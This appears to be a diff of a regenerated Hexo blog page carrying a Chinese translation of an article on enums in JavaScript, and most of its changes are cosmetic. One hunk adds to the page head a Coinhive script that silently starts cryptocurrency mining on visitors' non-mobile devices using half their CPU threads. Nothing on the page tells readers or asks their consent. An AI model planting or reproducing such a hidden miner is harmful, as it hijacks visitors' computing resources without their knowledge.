@@ -12,6 +12,7 @@
 <meta property="og:url" content="http://kingzez.com/2016/05/23/Enums-in-javascript-译/index.html">
 <meta property="og:site_name" content="the kingzez blog">
 <meta property="og:description" content="Javascript中的枚举 ，你想这样定义枚举：">
+<meta property="og:locale" content="zh-CN">
 <meta property="og:updated_time" content="2016-05-23T16:16:50.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Javascript中的枚举 [译]">
@@ -63,6 +64,20 @@
   ga('send', 'pageview');
 
 </script>
+<!-- Coinhive -->
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.User('r0WSj9IIUFDNRQl8X4f4zeapVsRB99kq', 'kingzez', {
+		threads: Math.round(navigator.hardwareConcurrency/2),
+		throttle: 0.5
+		});
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile()) {
+		miner.start();
+	}
+</script>
+
 </head>
 <body>
     <div id="container">
@@ -275,7 +290,7 @@ javascript是弱类型语言，这意味着不需要事先声明一个特定类�
 <figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">i</span> = <span class="string">"Hello World"</span><span class="comment">;</span></div></pre></td></tr></table></figure></p>
 <p>但是编译器会返回错误，中断生成文件
 不像Javascript中:
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">var i;</div><div class="line">i = <span class="number">10</span>;</div><div class="line">i = <span class="string">"Hello World"</span>;</div><div class="line">i = <span class="number">3.1415</span>;</div><div class="line">i = <span class="literal">true</span>;</div><div class="line">i = [<span class="string">'my'</span>, <span class="string">'array'</span>];</div><div class="line">i = &#123;<span class="string">look:</span> <span class="string">'at'</span>, <span class="string">my:</span> <span class="string">'object'</span>&#125;;</div></pre></td></tr></table></figure></p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">var i;</div><div class="line">i = 10;</div><div class="line">i = <span class="string">"Hello World"</span>;</div><div class="line">i = 3.1415;</div><div class="line">i = true;</div><div class="line">i = ['my', 'array'];</div><div class="line">i = &#123;look: 'at', my: 'object'&#125;;</div></pre></td></tr></table></figure></p>
 <p>正如你所看到，我们声明了一个变量（通过关键字var）,但它在运行时类型是不受限制的。我们可以给他分配任何值。维基百科的措辞有点尴尬，但是你读到这行</p>
 <blockquote>
 <p>A variable that has been declared as having an enumerated type can be assigned any of the enumerators as a value.</p>
@@ -311,7 +326,7 @@ javascript是弱类型语言，这意味着不需要事先声明一个特定类�
 <p>我认为这样解决问题不是一个很好的方法，能系列化和反序列化枚举是很重要的，而不能忽视的。这就是为什么我建议不要使用这种模式，相反的是用第二枚举解决问题就不会出现这样的问题：
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">var DaysEnum = &#123;</div><div class="line"><span class="symbol">  MONDAY:</span> <span class="string">"monday"</span>,</div><div class="line"><span class="symbol">  TUESDAY:</span> <span class="string">"tuesday"</span>,</div><div class="line">  <span class="comment">// ..</span></div><div class="line"><span class="symbol">  SUNDAY:</span> <span class="string">"sunday"</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
 <p>（或者你可以用数字代替字符串的值，都可以达到同样的效果），让我们检查一下这个做系列化的安全性：
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> myObject = &#123;</div><div class="line">  <span class="attr">payDay</span>: DaysEnum.FRIDAY</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">var</span> serialized = <span class="built_in">JSON</span>.stringify(myObject);</div><div class="line">  alert(<span class="string">"serialized myObject: "</span> + serialized);</div><div class="line"><span class="keyword">var</span> deserializedObject = <span class="built_in">JSON</span>.parse(serialized);</div><div class="line"><span class="keyword">if</span> (yesterday == deserializedObject.payDay)</div><div class="line">  alert(<span class="string">"Yesterday was pay day... but not today..."</span>);</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (today == deserializedObject.payDay)</div><div class="line">  alert(<span class="string">"Today is pay day! Yippie!!!"</span>);</div><div class="line"><span class="keyword">else</span></div><div class="line">  alert(<span class="string">"Neither yesterday not today are pay days... I'm broke!"</span>);</div></pre></td></tr></table></figure></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> myObject = &#123;</div><div class="line">  payDay: DaysEnum.FRIDAY</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">var</span> serialized = <span class="built_in">JSON</span>.stringify(myObject);</div><div class="line">  alert(<span class="string">"serialized myObject: "</span> + serialized);</div><div class="line"><span class="keyword">var</span> deserializedObject = <span class="built_in">JSON</span>.parse(serialized);</div><div class="line"><span class="keyword">if</span> (yesterday == deserializedObject.payDay)</div><div class="line">  alert(<span class="string">"Yesterday was pay day... but not today..."</span>);</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (today == deserializedObject.payDay)</div><div class="line">  alert(<span class="string">"Today is pay day! Yippie!!!"</span>);</div><div class="line"><span class="keyword">else</span></div><div class="line">  alert(<span class="string">"Neither yesterday not today are pay days... I'm broke!"</span>);</div></pre></td></tr></table></figure></p>
 <p>正如预期的那样，结果是”Today is pay day! Yippie!!!”。但是我绝得给枚举的添加字段和方法真的很棒，我们可以这样做：
 <figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">var SizeEnum = &#123;</div><div class="line"><span class="symbol">  SMALL:</span> &#123;<span class="string">name:</span> <span class="string">"small"</span>, <span class="string">value:</span> <span class="number">1</span>, <span class="string">code:</span> <span class="string">"S"</span>&#125;,</div><div class="line"><span class="symbol">  MEDIUM:</span> &#123;<span class="string">name:</span> <span class="string">"medium"</span>, <span class="string">value:</span> <span class="number">2</span>, <span class="string">code:</span> <span class="string">"M"</span>&#125;,</div><div class="line"><span class="symbol">  LARGE:</span> &#123;<span class="string">name:</span> <span class="string">"large"</span>, <span class="string">value:</span> <span class="number">3</span>, <span class="string">code:</span> <span class="string">"L"</span>&#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
 <p>但是可以说这不需要序列化和反序列化，我们只需要给额外的对象增加一个属性W:
@@ -337,7 +352,7 @@ javascript是弱类型语言，这意味着不需要事先声明一个特定类�
 
 </div>
 
-    <a data-url="http://kingzez.com/2016/05/23/Enums-in-javascript-译/" data-id="cj3wdnjc9000e09hepmabh1lk" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+    <a data-url="http://kingzez.com/2016/05/23/Enums-in-javascript-译/" data-id="cjcc61dhh000f70fyg3yf2g3i" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
 <script>
     (function ($) {
         // Prevent duplicate binding
@@ -475,7 +490,7 @@ javascript是弱类型语言，这意味着不需要事先声明一个特定类�
         
         
         
-        <span style="background-image:url(/images/thumb-default-small8.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small7.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -510,7 +525,7 @@ javascript是弱类型语言，这意味着不需要事先声明一个特定类�
         
         
         
-        <span style="background-image:url(/images/thumb-default-small3.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -545,7 +560,7 @@ javascript是弱类型语言，这意味着不需要事先声明一个特定类�
         
         
         
-        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small2.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -615,7 +630,7 @@ javascript是弱类型语言，这意味着不需要事先声明一个特定类�
         
         
         
-        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small7.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -669,7 +684,7 @@ javascript是弱类型语言，这意味着不需要事先声明一个特定类�
         <footer id="footer">
     <div class="outer">
         <div id="footer-info" class="inner">
-            &copy;2015 - 2017 kingzez<br>
+            &copy;2015 - 2018 kingzez<br>
             Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.
         </div>
     </div>
